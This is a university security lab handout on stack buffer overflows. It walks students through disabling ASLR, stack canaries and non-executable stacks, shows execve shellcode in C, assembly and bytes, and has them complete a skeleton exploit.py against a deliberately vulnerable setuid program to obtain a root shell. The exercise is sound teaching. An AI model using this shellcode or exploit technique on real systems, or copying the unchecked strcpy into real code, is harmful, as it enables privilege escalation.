---
title: |
  CITS3007 lab 4 (week 6)&nbsp;--&nbsp;Buffer overflows
---

It's recommended you complete this lab in pairs, if possible, and
discuss your results with your partner.

The objective of this lab is gain insight into buffer overflow
vulnerabilities and see how they can be exploited.
You will be given a `setuid` program with a buffer overflow vulnerability,
and your task is to develop a scheme to exploit the vulnerability and
gain root privileges.

## 1. Setup

### 1.1. Turning off countermeasures

Modern operating systems implement several security mechanisms to make
buffer overflow attacks more difficult. To simplify our attacks, we need to disable them first.



**Address Space Randomization**

:   Ubuntu and several other Linux-based systems uses address space
    randomization to randomize the starting address of heap and stack. This
    makes guessing the exact addresses difficult. This feature can be
    disabled by running the following command in the CITS3007
    development environment:

    ```
    $ sudo sysctl -w kernel.randomize_va_space=0
    ```

**Configuring `/bin/sh`**

:   In recent versions of Ubuntu OS, `/bin/sh` is a symbolic link pointing to the
    `/bin/dash` shell: run `ls -al /bin/sh` to see this.

    The dash program (as well as bash) implements a countermeasure that
    prevents it from being executed in a setuid process. If the shell
    detects that the effective user ID differs from the actual user ID
    (see last lab),
    it will immediately change the effective user ID back to the real user ID,
    essentially dropping the privilege.

    Since our victim program is a `setuid` program, and our attack
    relies on running `/bin/sh`, the
    countermeasure in `/bin/dash` makes our attack more difficult. 
    Therefore, we will link `/bin/sh` to
    (though with a little bit more effort, the countermeasure in
    `/bin/dash` can be easily defeated). Install the `zsh` package
    with the command `sudo apt get update && sudo apt-get install -y
    zsh`,
    then run the following command to link `/bin/sh` to `zsh`:

    ```
    $ sudo ln -sf /bin/zsh /bin/sh
    ```


**Non-executable stack**

:   When the program runs, the memory segment containing the stack can
    be marked non-executable. This feature can be turned off during
    compilation, by passing the option "`-z execstack`" to `gcc`.
    This option is passed onto the linker, `ld`, and marks the
    output binary as requiring an *executable* stack.

    This option is documented in `man ld`, and we will discuss it
    further when compiling our programs.


**Stack canaries**

:   The `gcc` compiler can include code in a compiled program
    which inserts [stack canaries][canaries] in the stack frames
    of a running program, and before returning from a function,
    checks that the canary is unaltered.

    A RedHat article on compiler [stack protection flags][gcc-stack-protector]
    outlines the flags which enable stack canaries in `gcc`; we
    will use the `-fno-stack-protector` flag to ensure they're disabled.
    (Further documentation on these options is available in the 
    [`gcc` manual][gcc-stack-man].) We discuss this option further
    when compiling our programs.

[canaries]: https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/
[gcc-stack-protector]: https://developers.redhat.com/articles/2022/06/02/use-compiler-flags-stack-protection-gcc-and-clang#stack_canary 
[gcc-stack-man]: https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/Instrumentation-Options.html#Instrumentation-Options



## 2. Shellcode

[*Shellcode*][shellcode] is a small portion of code that launches a
shell, and is widely used in code injection attacks.
The aim is to inject code into the running process that will allow us
to exploit the system. In a buffer overflow attack, we'll write that
code -- which is just a sequence of bytes -- into a location on the
stack, and try to convince the program to execute it.

[shellcode]: https://en.wikipedia.org/wiki/Shellcode


Represented in C, a piece of shellcode might look like the following:

```C
#include <stdio.h>

int main() {
  char *name[2];
  name[0] = "/bin/sh";
  name[1] = NULL;
  execve(name[0], name, NULL);
}
```

Read about the Linux `execve` system call by typing `man execve`; it
allows us to execute a program from C code. The `name` array is
effectively a list of pointers-to-`char`, with a `NULL` pointer used to
mark the end of the list.

However, we can't straightforwardly use `gcc` to obtain our shellcode.
Recall that shellcode is a *small* sequence of bytes that we want to
inject into a target process.
Try saving the above code as `shellcode.c`, and
compile it with `make shellcode.o shellcode`. Examine the size of the
compiled program with

```
$ du -sk shellcode
```

and you will see that the compiled binary is about 20 kilobytes -- far
too big and unwieldy for our purposes. (Once preprocessing is done on
the C code with `cpp`, and all header files and their definitions
are included, the resulting code is a lot bigger than the 9 lines above
would suggest. Read [here][teensy] about one user's attempts to get the
smallest possible "Hello world" program using `gcc`.)

[teensy]: http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html


Instead, the easiest way to construct shellcode is to write it in
assembly. The Intel 32-bit assembly code equivalent for the above C
code would be something like the following (which you are not required
to understand, but is presented here for interest):


``` {.asm .numberLines}
; Store the command on stack
xor  eax, eax
push eax
push "//sh"
push "/bin"
mov  ebx, esp ; ebx --> "/bin//sh": execve()'s 1st argument

; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()'s 2nd argument

; For environment variable
xor edx, edx ; edx = 0: execve()'s 3rd argument

; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()'s system call number
int 0x80
```

A brief explanation of the code (again, you're not required
to understand this in detail) is:

- The `"/sh"` and `"/bin"` arguments are pushed onto the stack (lines
  1--5)
- We need to pass three arguments to `execve()` via the `ebx`, `ecx` and
  `edx` registers, respectively.
  The majority of the shellcode basically constructs the content for these three arguments.
- The code in lines 17--19 is where we make the `execve` system call --
  that is, we request a service from the kernel.
  We do so by setting `al` to `0x0b` (`al` represents the lower 8 bits
  of the `eax` register),
  and execute the instruction "`int 0x80"`.

  The `0x0b` tells the kernel what system call we want to make -- `0x0b` is
  the system call number of `execve`. (A list of all the system call and
  their numbers are found in a Linux header called `unistd_32.h`,
  usually found at `/usr/include/x86_64-linux-gnu/asm/unistd_32.h`.
  On Ubuntu, this file will only exist if you've installed the package
  `linux-libc-dev`.)

  The `int` instruction generates a call to an *interrupt handler*,
  and `int 0x80` identifies a specific bit of kernel handler code
  which will handle system calls.

We won't do it in this lab, but that assembly code can be assembled
using [`nasm`][nasm], an assembler for the x86 CPU architecture.
`nasm` would compile the above assembly into an object file (called,
say, `sploit.o`),
and that resulting object file contains the exact sequence of bytes we
need
to insert in order to invoke `/bin/sh`. The following table shows that just
26 bytes (hex `0x1a`) are needed. The leftmost colum shows offsets in
hex,
the second column the exact byte values we want, and the last column
the assembly code:


```
off   bytes                       assembly code
---------------------------------------------------
   0:    31 c0                    xor    eax,eax
   2:    50                       push   eax
   3:    68 2f 2f 73 68           push   0x68732f2f
   8:    68 2f 62 69 6e           push   0x6e69622f
   d:    89 e3                    mov    ebx,esp
   f:    50                       push   eax
  10:    53                       push   ebx
  11:    89 e1                    mov    ecx,esp
  13:    31 d2                    xor    edx,edx
  15:    31 c0                    xor    eax,eax
  17:    b0 0b                    mov    al,0xb
  19:    cd 80                    int    0x80
```

[nasm]: https://www.nasm.us

### 2.1. Invoking the shellcode

Download the file [`lab04-code.zip`][lab4-zip] into the VM
(you can use the command `wget https://cits3007.github.io/labs/lab04-code.zip`)
and unzip it.

[lab4-zip]: https://cits3007.github.io/labs/lab04-code.zip

`cd` into the `shellcode` directory, and take a look at
`call_shellcode.c` (reproduced below):

```{.C .numberLines}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}
```

The purpose of this program is to demonstrate that our
shellcode byte-sequence does indeed invoke the shell
`/bin/sh`.

The byte sequences are stored in the array `shellcode` --
observe that the 32-bit version starts with `\x31\xc0\x50`,
which is the byte sequence we get from compiling our assembly code.

In line 27, we declare a *pointer to a function*, `func`; the address of
the "function" we're pointing at is in fact the bufer `code`.
So when that function pointer is invoked, the instructions sitting in
`code` will be executed.
Discuss with your lab partner what is happening here; ask the
lab facilitator for an explanation if you're not sure.

The code above includes two copies of the shellcode, one is 32-bit and the other is 64-bit. When we compile
the program using the -m32 flag, the 32-bit version will be used; without this flag, the 64-bit version will
be used. Using the provided Makefile, you can compile the code by typing
`make`. Two binaries will be
created, `a32.out` (32-bit) and `a64.out` (64-bit). Run them and describe your observations. It should be
noted that the compilation uses the `execstack` option, which allows code to be executed from the stack;
without this option, the program will fail. Try deleting the flags "`-z
execstac`" from the makefile and run the programs again -- what happens?

## 3. A vulnerable program

The vulnerable program used in this lab is called `stack.c`, which is in
the `code` folder from the zip file. This program has
a buffer overflow vulnerability, and your job is to exploit this
vulnerability and gain root privileges. The essential parts are shown
below (some inessential functions have been omitted):

```{.C .numberLines}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str) {
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv) {
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}
```

The above program has a buffer overflow vulnerability. It first reads an
input from a file called `badfile`, and then passes this input to another
buffer in the function `bof()`. The original input can have a maximum
length of 517 bytes, but the buffer in `bof()` is only `BUF SIZE` bytes
long, which is less than 517. Because `strcpy()` does not check
boundaries, buffer overflow will occur.

Since this program is a
root-owned `setuid` program, if a normal user is able to exploit this
vulnerability, the user might be able to get a root shell. Note
that the program gets its input from a file called
`badfile`, which is under users' control. Now, our objective is to
create the contents for badfile, such that when the vulnerable program
copies the contents into its buffer, a root shell can be spawned.

### 3.1. Compilation

To compile the above vulnerable program, do not forget to turn off the
stack canaries and the
non-executable stack protections using the `-fno-stack-protector` and
"`-z execstack`" options.

After compilation, we need to make the program a root-owned `setuid` program. We can achieve this
by first changing the ownership of the program to root, and
then changing the permission to `4755` to
enable the `setuid` bit:

```
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

It should be noted that changing ownership must be done before turning
on the `setuid` bit, because ownership change will cause the `setuid` bit to be turned off.

The compilation and setup commands are already included in Makefile, so
we just need to type `make`
to execute those commands. The variables L1, ..., L4 are set in Makefile; they will be used during the
compilation.

### 3.2. Launching Attack on 32-bit Program

To exploit the buffer-overflow vulnerability in the target program, the
most important thing to know is the distance between the buffer’s
starting position and the place where the return-address is stored. We
will use a debugging method to find it out. Since we have the source
code of the target program, we can compile it with the debugging flag
turned on. That will make it more convenient to debug.

We will add the `-g` flag to the `gcc` command, so debugging information is added to the binary.
If you run
`make`, the debugging version is already created. We will use `gdb` to
debug `stack-L1-dbg`. We need to
create a file called `badfile` before running the program.

```
$ touch badfile # Create an empty badfile
$ gdb stack-L1-dbg # start gdb
```

Within gdb, run the commands:

```
gdb$ b bof 
gdb$ run
gdb$ next
gdb$ print $ebp
gdb$ print &buffer
gdb$ quit
```

This will set a break point at function `bof()` and run the program.
We stop at the `bof` function and step to the `strcpy` call.

The `ebp` register is used at runtime to point to the current stack
frame.
When gdb stops "inside" the `bof()` function, it actually
stops *before* the `ebp` register is set to point to the
current stack frame, so if we print out the value of ebp here, we will
get the *caller's* `ebp` value. We need
to use `next` to execute a few instructions and stop after the `ebp`
register is modified to point to the stack
frame of the `bof()` function.

It should be noted that the frame pointer value obtained from gdb is
**different** from that during the actual execution (without using gdb).
This is because gdb has pushed some environment data into the stack
before running the debugged program. When the program runs directly
without using gdb, the stack does not have those data, so the actual
frame pointer value will be larger. You should keep this in mind when
constructing your payload.

To exploit the buffer
overflow vulnerability in the target program, we need to prepare a payload, and save
it inside `badfile`. We will use a Python program to do that. We provide a skeleton program called
`exploit.py`, which is included in the lab zip file.
The code is incomplete, and students need to replace
some of the essential values in the code:

```{.python .numberLines}
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"  
  "\x90\x90\x90\x90"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x00           # Change this number 
offset = 0              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

You will need to change the `exploit.py` code to:

- Write the correct sequence of shellcode bytes, at line 5.
  (Currently, the variable `shellcode` just contains junk, "no-op"
  instructions.)
- Alter the `start` variable at line 15. This specifies at exactly
  what offset in `badfile` the shellcode bytes are inserted.
- Alter the `ret` variable at line 20 and the `offset` variable
  at line 21. `offset` specifies a place in `badcode` where
  we want to insert an "address to return to", and `ret` is that
  address.

Running `exploit.py`
will generate a file `badfile`.
Then run the vulnerable program `stack`.

If your exploit is implemented correctly, you should be able to get a root shell:

```
$ ./exploit.py # create the badfile
$ ./stack-L1   # launch the attack by running the vulnerable program
# <---- Bingo! You’ve got a root shell!
```

Try running the command `id` to confirm you are root.


<!-- vim: syntax=markdown tw=72 :
-->
